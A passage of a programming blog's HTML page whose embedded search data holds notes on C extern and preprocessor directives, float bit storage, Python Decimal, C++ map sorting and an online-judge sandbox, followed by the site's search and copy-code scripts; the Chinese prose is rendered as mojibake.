è¿˜æ˜¯.cï¼Œè¿˜æ˜¯ä¸è¿™ä¸ª.h åŒåçš„.cï¼Œéƒ½æ²¡æœ‰ä»»ä½•å¿…ç„¶å…³ç³»ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;externå…³é”®å­—&#34;&gt;externå…³é”®å­—&lt;/h2&gt;
&lt;p&gt;åœ¨ä¸€ä¸ª.cæ–‡ä»¶ä¸­å¯ä»¥ä½¿ç”¨externå…³é”®å¼•ç”¨å…¶å®ƒ.cæ–‡ä»¶ä¸­&lt;strong&gt;å£°æ˜&lt;/strong&gt;çš„çš„å˜é‡å‡½æ•°..&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;extern int a; // å£°æ˜ä¸€ä¸ªå…¨å±€å˜é‡ a
int a; // å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡ a
extern int a = 0; // å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡ a å¹¶ç»™åˆå€¼
int a = 0; // å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡ a, å¹¶ç»™åˆå€¼
ç¬¬å››ä¸ªç­‰äºç¬¬ä¸‰ä¸ªï¼Œéƒ½æ˜¯å®šä¹‰ä¸€ä¸ªå¯ä»¥è¢«å¤–éƒ¨ä½¿ç”¨çš„å…¨å±€å˜é‡ï¼Œå¹¶ç»™åˆå€¼ã€‚

å®šä¹‰åªèƒ½å‡ºç°åœ¨ä¸€å¤„ï¼Œä¸ç®¡æ˜¯int aï¼›è¿˜æ˜¯extern int a=0ï¼›è¿˜æ˜¯int a=0;éƒ½åªèƒ½å‡ºç°ä¸€æ¬¡ï¼Œè€Œå£°æ˜extern int aå¯ä»¥å‡ºç°å¾ˆå¤šæ¬¡ã€‚

å½“è¦å¼•ç”¨ä¸€ä¸ªå…¨å±€å˜é‡æ—¶ï¼Œå¿…é¡»è¦å£°æ˜ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ‰å¥½çš„ç”¨æ³•ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// a.c
#include&amp;lt;stdio.h&amp;gt;
int x = 5;
int fun(int a, int b)
{
    return a + b;
}

// a.h
extern int x;
extern int fun();

// b.c
#include&amp;lt;stdio.h&amp;gt;
#include &amp;quot;a.h&amp;quot;
int main()
{
    printf(&amp;quot;%d&amp;quot;, x);
    printf(&amp;quot;%d&amp;quot;, fun(1,2));
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;é¢„ç¼–è¯‘æŒ‡ä»¤&#34;&gt;é¢„ç¼–è¯‘æŒ‡ä»¤&lt;/h2&gt;
&lt;p&gt;é¢„ç¼–è¯‘æŒ‡ä»¤ä¸»è¦ä½œç”¨æ˜¯é€šè¿‡å†…å»ºåŠŸèƒ½å †ä¸€ä¸ªèµ„æºè¿›è¡Œç­‰ä»·æ›¿æ¢ï¼Œæœ€å¸¸è§çš„æœ‰ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ–‡ä»¶åŒ…å«&lt;br&gt;
&lt;code&gt;#include&lt;/code&gt;ä¸»è¦æ˜¯åšä¸ºæ–‡ä»¶çš„å¼•ç”¨ç»„åˆæºç¨‹åºæ­£æ–‡ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;#include &lt;iostream&gt; //æ ‡å‡†åº“å¤´æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;#include &amp;lt;iostream.h&amp;gt; //æ—§å¼çš„æ ‡å‡†åº“å¤´æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;#include &amp;quot;io.h&amp;quot; //ç”¨æˆ·è‡ªå®šä¹‰çš„å¤´æ–‡ä»¶ï¼Œå¯¹äº#include &amp;lt;io.h&amp;gt; ï¼Œç¼–è¯‘å™¨ä»æ ‡å‡†åº“è·¯å¾„å¼€å§‹æœç´¢ï¼Œå¯¹äº#include &amp;quot;io.h&amp;quot; ï¼Œç¼–è¯‘å™¨ä»ç”¨æˆ·çš„å·¥ä½œè·¯å¾„å¼€å§‹æœç´¢&lt;/li&gt;
&lt;li&gt;#include &amp;quot;../file.h&amp;quot; //UNIXä¸‹çš„çˆ¶ç›®å½•ä¸‹çš„å¤´æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;#include &amp;quot;/usr/local/file.h&amp;quot; //UNIXä¸‹çš„å®Œæ•´è·¯å¾„&lt;/li&gt;
&lt;li&gt;#include &amp;quot;..\file.h&amp;quot; //Dosä¸‹çš„çˆ¶ç›®å½•ä¸‹çš„å¤´æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;#include &amp;quot;\usr\local\file.h&amp;quot; //Dosä¸‹çš„å®Œæ•´è·¯å¾„&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;æ¡ä»¶ç¼–è¯‘&lt;br&gt;
&lt;code&gt;#if #ifndef #ifdef #endif #undef&lt;/code&gt;ä¸»è¦æ˜¯è¿›è¡Œç¼–è¯‘æ—¶è¿›è¡Œæœ‰é€‰æ‹©çš„æŒ‘é€‰ï¼Œæ³¨é‡Šæ‰ä¸€äº›æŒ‡å®šçš„ä»£ç ï¼Œä»¥è¾¾åˆ°ç‰ˆæœ¬æ§åˆ¶ã€é˜²æ­¢å¯¹æ–‡ä»¶é‡å¤åŒ…å«çš„åŠŸèƒ½ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define            å®šä¹‰ä¸€ä¸ªé¢„å¤„ç†å®
#undef            å–æ¶ˆå®çš„å®šä¹‰

#if                   ç¼–è¯‘é¢„å¤„ç†ä¸­çš„æ¡ä»¶å‘½ä»¤ï¼Œç›¸å½“äºCè¯­æ³•ä¸­çš„ifè¯­å¥
#ifdef              åˆ¤æ–­æŸä¸ªå®æ˜¯å¦è¢«å®šä¹‰ï¼Œè‹¥å·²å®šä¹‰ï¼Œæ‰§è¡Œéšåçš„è¯­å¥
#ifndef            ä¸#ifdefç›¸åï¼Œåˆ¤æ–­æŸä¸ªå®æ˜¯å¦æœªè¢«å®šä¹‰
#elif                è‹¥#if, #ifdef, #ifndefæˆ–å‰é¢çš„#elifæ¡ä»¶ä¸æ»¡è¶³ï¼Œåˆ™æ‰§è¡Œ#elifä¹‹åçš„è¯­å¥ï¼Œç›¸å½“äºCè¯­æ³•ä¸­çš„else-if
#else              ä¸#if, #ifdef, #ifndefå¯¹åº”, è‹¥è¿™äº›æ¡ä»¶ä¸æ»¡è¶³ï¼Œåˆ™æ‰§è¡Œ#elseä¹‹åçš„è¯­å¥ï¼Œç›¸å½“äºCè¯­æ³•ä¸­çš„else
#endif             #if, #ifdef, #ifndefè¿™äº›æ¡ä»¶å‘½ä»¤çš„ç»“æŸæ ‡å¿—.
#defined         ã€€ä¸#if, #elifé…åˆä½¿ç”¨ï¼Œåˆ¤æ–­æŸä¸ªå®æ˜¯å¦è¢«å®šä¹‰
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;å¸ƒå±€æ§åˆ¶&lt;br&gt;
&lt;code&gt;#progma&lt;/code&gt; ä¸»è¦åŠŸèƒ½æ—¶ä¸ºç¼–è¯‘ç¨‹åºæä¾›éå¸¸è§„çš„æ§åˆ¶æµä¿¡æ¯ã€‚&lt;/li&gt;
&lt;li&gt;å®æ›¿æ¢&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;æµ®ç‚¹æ•°çš„å­˜å‚¨æ–¹å¼&#34;&gt;æµ®ç‚¹æ•°çš„å­˜å‚¨æ–¹å¼&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1600483237666.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;decimaldecimal&#34;&gt;decimal.Decimal&lt;/h2&gt;
&lt;p&gt;pythonä¸­çš„decimal.Decimalç±»å‹å¯ä»¥éå¸¸ç²¾ç¡®åœ°å­˜å‚¨åœ¨è®¡ç®—æœºä¸­ï¼Œå…¶ä¼˜äºfloatç±»å‹ã€‚&lt;br&gt;
ç”¨æ³•ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from decimal import Decimal

# å­—ç¬¦ä¸²/æµ®ç‚¹æ•°è½¬æ¢ä¸ºDecimal
Decimal(&#39;1.11&#39;)
# &amp;gt;&amp;gt;Decimal(&#39;1.11&#39;)
Decimal(1.11)
# &amp;gt;&amp;gt;Decimal(&#39;1.1100000000000000976996261670137755572795867919921875&#39;)

# å››èˆäº”å…¥
Decimal(&#39;50.5679&#39;).quantize(Decimal(&#39;0.00&#39;))
# &amp;gt;&amp;gt;Decimal(&#39;50.57&#39;)

# Decimal ç»“æœè½¬åŒ–ä¸ºstring
str(Decimal(&#39;3.40&#39;).quantize(Decimal(&#39;0.0&#39;)))
# &amp;gt;&amp;gt;&#39;3.4&#39;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°†æµ®ç‚¹æ•°ä»¥äºŒè¿›åˆ¶è¾“å‡ºï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;

int main(void)
{
	float fnum = 1;
	int i;
	int * p = (int *)&amp;amp;fnum;//å®šä¹‰ä¸€ä¸ªæŒ‡å‘fnumçš„æŒ‡é’ˆ
        int x=0;//è®¾ç½®flagå˜é‡
	while (fnum != 0)//ä»¥0ä½œä¸ºè¾“å…¥ç»“æŸæ ‡å¿—
	{
		printf(&amp;quot;input a num: &amp;quot;);
		x=scanf(&amp;quot;%f&amp;quot;, &amp;amp;fnum);
                if(!x)//åˆ¤æ–­æ˜¯å¦è¾“å…¥æˆåŠŸ
                {
                       printf(&amp;quot;wrong\n&amp;quot;);
                       fflush(stdin);//æ¸…ç©ºè¾“å…¥æµï¼Œä¸ç„¶ä¼šæ­»å¾ªç¯
                       continue;
                }
		for (i = 31; i &amp;gt;= 0; i--)
		{
                      /*å°†1å·¦ç§»iä½ï¼Œé€šè¿‡ä¸è¿ç®—åˆ¤æ–­ç¬¬iä½æ˜¯å¦ä¸º1*/
                      printf(&amp;quot;%d&amp;quot;, (*p &amp;amp; (1 &amp;lt;&amp;lt; i) ? 1: 0));
                      /*æ§åˆ¶ç©ºæ ¼è¾“å…¥*/
                      if(i==31||i==23)
                           printf(&amp;quot;  &amp;quot;);
                      if(i==27||i==19||i==15||i==11||i==7||i==3)
                           printf(&amp;quot; &amp;quot;);
		}
		printf(&amp;quot;\n&amp;quot;);
	}
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;å®ç°æŒ‰ç…§mapçš„valueæ’åº&#34;&gt;å®ç°æŒ‰ç…§mapçš„valueæ’åº&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;//åŠŸèƒ½ï¼šè¾“å…¥å•è¯ï¼Œç»Ÿè®¡å•è¯å‡ºç°æ¬¡æ•°å¹¶æŒ‰ç…§å•è¯å‡ºç°æ¬¡æ•°ä»å¤šåˆ°å°‘æ’åº  
#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstdlib&amp;gt;  
#include &amp;lt;map&amp;gt;  
#include &amp;lt;vector&amp;gt;  
#include &amp;lt;string&amp;gt;  
#include &amp;lt;algorithm&amp;gt;  

using namespace std;
   
int cmp(const pair&amp;lt;string, int&amp;gt;&amp;amp; x, const pair&amp;lt;string, int&amp;gt;&amp;amp; y)  
{  
    return x.second &amp;gt; y.second;  
}  
   
void sortMapByValue(map&amp;lt;string, int&amp;gt;&amp;amp; tMap,vector&amp;lt;pair&amp;lt;string, int&amp;gt; &amp;gt;&amp;amp; tVector)  
{  
    for (map&amp;lt;string, int&amp;gt;::iterator curr = tMap.begin(); curr != tMap.end(); curr++)   
        tVector.push_back(make_pair(curr-&amp;gt;first, curr-&amp;gt;second));    
   
    sort(tVector.begin(), tVector.end(), cmp);  
}  
int main()  
{  
    map&amp;lt;string, int&amp;gt; tMap;  
    string word;  
    while (cin &amp;gt;&amp;gt; word)  
    {  
        pair&amp;lt;map&amp;lt;string,int&amp;gt;::iterator,bool&amp;gt; ret = tMap.insert(make_pair(word, 1));  
        if (!ret.second)  
            ++ret.first-&amp;gt;second;  
    }   
   
    vector&amp;lt;pair&amp;lt;string,int&amp;gt;&amp;gt; tVector;  
    sortMapByValue(tMap,tVector);  
    for(int i=0;i&amp;lt;tVector.size();i++)  
        cout&amp;lt;&amp;lt;tVector[i].first&amp;lt;&amp;lt;&amp;quot;: &amp;quot;&amp;lt;&amp;lt;tVector[i].second&amp;lt;&amp;lt;endl;  
   
    system(&amp;quot;pause&amp;quot;);  
    return 0;  
} 
&lt;/code&gt;&lt;/pre&gt;
">ã€C++ã€‘å¸¸è§é—®é¢˜</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/oj-pan-ti-he-xin/"" data-c="
          &lt;h2 id=&#34;1-online-judge-åˆ¤é¢˜æ ¸å¿ƒ&#34;&gt;1 Online Judge åˆ¤é¢˜æ ¸å¿ƒ&lt;/h2&gt;
&lt;p&gt;åˆ¤é¢˜æ ¸å¿ƒç¨‹åºé€šè¿‡æ„å»ºä¸€ä¸ªæ²™ç›’ï¼Œè¿è¡Œç”¨æˆ·æäº¤çš„ä»£ç ï¼Œ åˆ©ç”¨ptraceè·Ÿè¸ªï¼Œé™åˆ¶ç”¨æˆ·ä»£ç çš„è¡Œä¸ºå’Œèµ„æºæ¶ˆè€—ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;core.h&lt;/code&gt;æ–‡ä»¶ä¸­æ˜¯ä¸€äº›å¸¸é‡å’Œå…¨å±€å˜é‡çš„å®šä¹‰&lt;/p&gt;
&lt;p&gt;&lt;code&gt;core.cpp&lt;/code&gt;æ˜¯ä¸»ç¨‹åºæ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;code&gt;logger.h&lt;/code&gt;æ˜¯ä¸€ä¸ªç®€æ˜“çš„æ—¥å¿—ç¨‹åº&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rf_table.h&lt;/code&gt;æ˜¯ä¸€ä¸ªé™åˆ¶ç³»ç»Ÿè°ƒç”¨çš„è¡¨&lt;/p&gt;
&lt;p&gt;åˆ¤é¢˜æ ¸å¿ƒé€šè¿‡ä¼ å…¥å‘½ä»¤è¡Œå‚æ•°è·çŸ¥è¾“å…¥ï¼Œç»“æœè¾“å‡ºåˆ°æ–‡ä»¶ï¼Œ æ‰€ä»¥ä¸å…·æœ‰çº¿ç¨‹å®‰å…¨æ€§ã€‚&lt;/p&gt;
&lt;h2 id=&#34;2-å‚æ•°&#34;&gt;2 å‚æ•°&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;-c&lt;/code&gt; æºä»£ç è·¯å¾„&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-t&lt;/code&gt; æ—¶é—´é™åˆ¶ï¼Œå¯é€‰ï¼Œé»˜è®¤1000 MS&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-m&lt;/code&gt; å†…å­˜é™åˆ¶ï¼Œå¯é€‰ï¼Œé»˜è®¤65535 KB&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-s&lt;/code&gt; è¡¨ç¤ºæ˜¯å¦æ˜¯special judge&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-S&lt;/code&gt; special judgeç¨‹åºçš„è¯­è¨€ï¼Œ1æ˜¯Cï¼Œ2æ˜¯C++ï¼Œ3æ˜¯Java&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-d&lt;/code&gt; è¡¨ç¤ºè¿è¡Œçš„æ–‡ä»¶å¤¹&lt;/p&gt;
&lt;p&gt;ç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo ./Core -c ./test/test.c -t 1000 -m 65535 -s -S 2 -d ./test/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸Šé¢è¡¨æ˜ï¼Œç”¨æˆ·æäº¤çš„ä»£ç æ˜¯&lt;code&gt;./test/test.c&lt;/code&gt;ï¼Œæ—¶é™1000 msï¼Œå†…å­˜é™åˆ¶65535 KBï¼Œ éœ€è¦SpecialJudgeï¼ŒSpecialJudgeç¨‹åºçš„è¯­è¨€æ˜¯C++ï¼Œè¿è¡Œçš„æ–‡ä»¶å¤¹åœ¨&lt;code&gt;./test/&lt;/code&gt;ä¸‹ã€‚&lt;/p&gt;
&lt;h2 id=&#34;3-ç¨‹åºç¼–è¯‘&#34;&gt;3 ç¨‹åºç¼–è¯‘&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;g++ core.cpp -o Core -O2
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;4-çº¦å®š&#34;&gt;4 çº¦å®š&lt;/h2&gt;
&lt;p&gt;æ„å»ºçš„æ²™ç›’åœ¨&lt;code&gt;./test/&lt;/code&gt;æ–‡ä»¶å¤¹ä¸‹&lt;/p&gt;
&lt;p&gt;å…¶ä¸­cè¯­è¨€ç¨‹åºæ˜¯xxx.cï¼ŒC++ ç¨‹åºæ˜¯xxx.cppï¼ŒJavaç¨‹åºæ˜¯Main.java&lt;/p&gt;
&lt;p&gt;æ ‡å‡†è¾“å…¥æ–‡ä»¶æ˜¯&lt;code&gt;in.in&lt;/code&gt;ï¼Œæ ‡å‡†è¾“å‡ºæ–‡ä»¶æ˜¯&lt;code&gt;out.out&lt;/code&gt;ï¼Œç¨‹åºè¿è¡Œè¿”å›çš„ç»“æœæ˜¯&lt;code&gt;result.txt&lt;/code&gt;æ–‡ä»¶&lt;/p&gt;
&lt;h2 id=&#34;5-specialjudge&#34;&gt;5 SpecialJudge&lt;/h2&gt;
&lt;p&gt;SpecialJudgeç¨‹åºæ˜¯ä¸€ä¸ªå·²ç»ç¼–è¯‘å¥½çš„ç¨‹åºï¼Œåå­—å«&lt;code&gt;SpecialJudge&lt;/code&gt;ã€‚è¿è¡Œç»“æŸåè¯·è‡ªè¡Œæ¸…ç†&lt;code&gt;./test/&lt;/code&gt;æ–‡ä»¶å¤¹ä¸‹çš„å„ç§æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;SpecialJudge ç¨‹åºç¼–å†™æ ‡å‡†ä¸&lt;a href=&#34;https://github.com/quark-zju/ljudge&#34;&gt;ljudge&lt;/a&gt;å…¼å®¹&lt;/p&gt;
&lt;p&gt;SpecialJudge ç¨‹åºçš„æ ‡å‡†æµï¼ˆstdinï¼‰æ˜¯é¢˜ç›®çš„è¾“å…¥æ•°æ®ï¼ŒåŒæ—¶Specialç¨‹åºè¿˜å¯ä»¥æ‰“å¼€ä»¥ä¸‹å‡ ä¸ªæ–‡ä»¶&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;input&amp;quot;&lt;/code&gt;ï¼šè¾“å…¥æ•°æ®ï¼ˆä¹Ÿå¯ç›´æ¥ç”±stdinè¯»å…¥ï¼‰&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;output&amp;quot;&lt;/code&gt;ï¼šè¾“å‡ºæ•°æ®&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;user_output&amp;quot;&lt;/code&gt; (æˆ–è€…argv[1]): ç”¨æˆ·ç¨‹åºç»™å‡ºçš„è¾“å‡º&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;user_code&amp;quot;&lt;/code&gt; : ç”¨æˆ·çš„ç¨‹åºä»£ç &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SpecialJudge ç¨‹åºéœ€è¦ä½¿ç”¨ exitcode è¿”å›è¯„æµ‹ç»“æœï¼Œ0 ä»£è¡¨ Acceptedï¼Œ 1 ä»£è¡¨Wrong Answerï¼Œ 2 ä»£è¡¨Presentation Error&lt;/p&gt;
&lt;p&gt;ä¸‹é¢æ˜¯ä¸€ä¸ªSpecialJudge ç¨‹åºçš„æ ·ä¾‹ï¼Œæ£€æµ‹Tä¸ªCaseä¸­ç”¨æˆ·è¾“å…¥çš„ä¸¤ä¸ªæ•°æ˜¯çš„æ˜¯å¦ç­‰äºæ ‡å‡†è¾“å‡º&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;fstream&amp;gt;
using namespace std;
const int res_ac = 0;
const int res_wa = 1;
const int res_pe = 2;
int T;
int main()
{
	ifstream input(&amp;quot;input&amp;quot;, ios::in);
	ifstream output(&amp;quot;output&amp;quot;, ios::in);
	ifstream user_output(&amp;quot;user_output&amp;quot;, ios::in);
	ifstream user_code(&amp;quot;user_code&amp;quot;, ios::in);
	int user_ans = 0;
	bool flag = true;
	input &amp;gt;&amp;gt; T;
	while (T--)
	{
		int a, b, c;
		user_output &amp;gt;&amp;gt; a &amp;gt;&amp;gt; b;
		output &amp;gt;&amp;gt; c;
		flag &amp;amp;= (a + b == c);
	}
	if (flag) return res_ac;
	else return res_wa;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;6-resulttxt&#34;&gt;6 result.txt&lt;/h2&gt;
&lt;p&gt;è¿”å›ç»“æœæ ¼å¼ï¼š&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€è¡Œï¼šç»“æœï¼Œ&lt;code&gt;Compile Error&lt;/code&gt;ç­‰&lt;/p&gt;
&lt;p&gt;ç¬¬äºŒè¡Œï¼šè¿è¡Œæ—¶é—´ï¼Œä¸å¸¦å•ä½ï¼Œé»˜è®¤æ¯«ç§’&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸‰è¡Œï¼šå†…å­˜æ¶ˆè€—ï¼Œä¸å¸¦å•ä½ï¼Œé»˜è®¤KB&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹æ¥æ‰€æœ‰è¡Œï¼šé¢å¤–ä¿¡æ¯ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸ºç©ºï¼Œå½“&lt;code&gt;Compile Error&lt;/code&gt;æ—¶ï¼Œç¼–è¯‘é”™è¯¯ä¿¡æ¯å­˜åœ¨è¿™é‡Œ&lt;/p&gt;
&lt;h2 id=&#34;7-re&#34;&gt;7 RE&lt;/h2&gt;
&lt;p&gt;https://github.com/NJUST-FishTeam/OnlineJudgeCore&lt;/p&gt;
">OJ åˆ¤é¢˜æ ¸å¿ƒ</a>
      </div>
      
    </div>
    <div class="page">
      <div id="page_ul"></div>
    </div>
  </div>
</div>
<script>
  !function () {
    let searchMask = document.querySelector('#search_mask');
    let result = document.querySelector('#result');
    let items = document.querySelectorAll('.item');
    let searchBox = document.querySelector('#search');
    let statCount = document.querySelector('#stat_count');
    let statTimes = document.querySelector('#stat_times');
    let pageUl = document.querySelector('#page_ul');
    let close = document.querySelector('#close');
    
    close.addEventListener('click', function() {
      searchMask.style = 'display: none;'
    })

    let finds = [];
    let contents = [];
    let pageSize = 10;
    items.forEach(item => {
      let a = item.querySelector('a');
      contents.push({
        title: a.innerText,
        details: a.dataset.c,
        link: a.href
      })
      item.remove();
    })

    function insertStr(soure, start, count) {
      let newStr = soure.substr(start, count);
      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
    }

    pageUl.addEventListener('click', function(event) {
      let target = event.target;
      if (target.__proto__ === HTMLSpanElement.prototype) {
        appendResults(parseInt(target.dataset.i));
      }
    })

    function appendResults(index) {
      let htmlResult = '';
      let start = index || 0;
      let end = Math.min(start + pageSize, finds.length);
      for (let i = start; i < end; i++) {
        const current = finds[i];
        let html = current.title;
        let sum = 0;
        let positions = current.positions;
        positions.forEach(position => {
          html = insertStr(html, position.start + sum, position.count);
          sum += 9;
        })
        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
      }
      result.innerHTML = htmlResult;
      pageUl.innerHTML = '';
      let count = finds.length / pageSize;
      let lis = '';
      if (start !== 0) {
        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
      }
      for (let i = 0; i < count; i++) {
        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
      }
      if (start+1 < count) {
        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
      }
      pageUl.innerHTML = lis;
    }

    function search(delay) {
      let timer = null
      return function () {
        clearTimeout(timer)
        timer = setTimeout(() => {
          let start = Date.now();
          let segments = searchBox.value.split(' ').filter(c => c != '');
          if (segments.length <= 0) {
            return;
          }
          finds = [];
          let htmlResult = '';
          contents.forEach(content => {
            let title = content.title;
            let positions = [];
            let find = false;
            segments.forEach((segment) => {
              if (content.title.includes(segment)) {
                find = true;
                positions.push({
                  start: content.title.indexOf(segment),
                  count: segment.length
                })
              } else if (content.details.includes(segment)) {
                find = true;
              }
            });
            if (find) {
              finds.push({
                title: content.title,
                link: content.link,
                positions
              });
            }
          })
          appendResults(0);
          statCount.textContent = finds.length;
          statTimes.textContent = Date.now() - start;
        }, delay)
      }
    }
    searchBox.addEventListener('input', search(200));
  }()
</script>

<input hidden id="copy" />
<script>
  !function () {
    let times = document.querySelectorAll('.publish-time');
    for (let i = 0; i < times.length; i++) {
      let date = times[i].dataset.t;
      let time = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
      if (time < 60) {
        str = time + 'ç§’ä¹‹å‰';
      } else if (time < 3600) {
        str = Math.floor(time / 60) + 'åˆ†é’Ÿä¹‹å‰';
      } else if (time >= 3600 && time < 86400) {
        str = Math.floor(time / 3600) + 'å°æ—¶ä¹‹å‰';
      } else if (time >= 86400 && time < 259200) {
        str = Math.floor(time / 86400) + 'å¤©ä¹‹å‰';
      } else {
        str = times[i].textContent;
      }
      times[i].textContent = str;
    }
  }();
</script>

<script>
  let language = '';
  if (language !== '') {
    let map = new Map();
    if (language === 'en') {
      map.set('search', 'Search');
      map.set('category', 'Categories');
      map.set('article', 'Articles');
      map.set('tag', 'Tags');
      map.set('top', 'Top');
      map.set('publish', 'published');
      map.set('minute', ' minutes');
      map.set('read-more', 'Read More');
      map.set('view', 'View');
      map.set('words', ' words');
      map.set('category-in', 'category in');
      map.set('preview', 'Meta');
      map.set('index', 'Toc');
      map.set('no-archives', "You haven't created yet");
      map.set('archives', " articles in total");
      map.set('cloud-tags', " tags in total");
      map.set('copyright', "Copyright: ");
      map.set('author', "Author: ");
      map.set('link', "Link: ");
      map.set('leave-message', "Leave a message");
      map.set('format', "Links Format");
      map.set('site-name', "Name: ");
      map.set('site-link', "Link: ");
      map.set('site-desc', "Desc: ");
      map.set('stat', " related results, taking ");
      map.set('stat-time', " ms");
      map.set('site-img', "Image: ");
    }

    if (map.size > 0) {
      let lanElems = document.querySelectorAll('.language');
      lanElems.forEach(elem => {
        let lan = elem.dataset.lan, text = map.get(lan);
        if (elem.__proto__ === HTMLInputElement.prototype) {
          elem.placeholder = text
        } else {
          if (elem.dataset.count) {
            text = elem.dataset.count + text;
          }
          elem.textContent = text;
        }
      })
    }
  }
  //æ‹¿æ¥ä¸»ä¹‰(çœŸé¦™)^_^ï¼ŒClipboard å®ç°æ‘˜è‡ªæ˜é‡‘ https://juejin.im/post/5aefeb6e6fb9a07aa43c20af
  window.Clipboard = (function (window, document, navigator) {
    var textArea,
      copy;

    // åˆ¤æ–­æ˜¯ä¸æ˜¯iosç«¯
    function isOS() {
      return navigator.userAgent.match(/ipad|iphone/i);
    }
    //åˆ›å»ºæ–‡æœ¬å…ƒç´ 
    function createTextArea(text) {
      textArea = document.createElement('textArea');
      textArea.value = text;
      textArea.style.width = 0;
      textArea.style.height = 0;
      textArea.clientHeight = 0;
      textArea.clientWidth = 0;
      document.body.appendChild(textArea);
    }
    //é€‰æ‹©å†…å®¹
    function selectText() {
      var range,
        selection;

      if (isOS()) {
        range = document.createRange();
        range.selectNodeContents(textArea);
        selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
        textArea.setSelectionRange(0, 999999);
      } else {
        textArea.select();
      }
    }

    //å¤åˆ¶åˆ°å‰ªè´´æ¿
    function copyToClipboard() {
      try {
        document.execCommand("Copy")
      } catch (err) {
        alert("å¤åˆ¶é”™è¯¯ï¼è¯·æ‰‹åŠ¨å¤åˆ¶ï¼")
      }
      document.body.removeChild(textArea);
    }

    copy = function (text) {
      createTextArea(text);
      selectText();
      copyToClipboard();
    };

    return {
      copy: copy
    };
  })(window, document, navigator);

  function copyCode(e) {
    if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
      let code = e.currentTarget.querySelector('code');
      var text = code.innerText;
      if (e.srcElement.textContent === 'å¤åˆ¶æˆåŠŸ') {
        return;
      }
      e.srcElement.textContent = 'å¤åˆ¶æˆåŠŸ';
      (function (elem) {
        setTimeout(() => {
          if (elem.textContent === 'å¤åˆ¶æˆåŠŸ') {
            elem.textContent = 'å¤åˆ¶ä»£ç '
          }
        }, 1000);
      })(e.srcElement)
      Clipboard.copy(text);
    }
  }

  let pres = document.querySelectorAll('pre');
  pres.forEach(pre => {
    let code = pre.querySelector('code');
    let copyElem = document.createElement('span');
    copyElem.classList.add('copy-code');
    copyElem.textContent = 'å¤åˆ¶ä»£ç ';
    pre.appendChild(copyElem);
    pre.onclick = copyCode
  })

</script>
<script src="/media/js/motion.js"></script>

<script src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
<script>
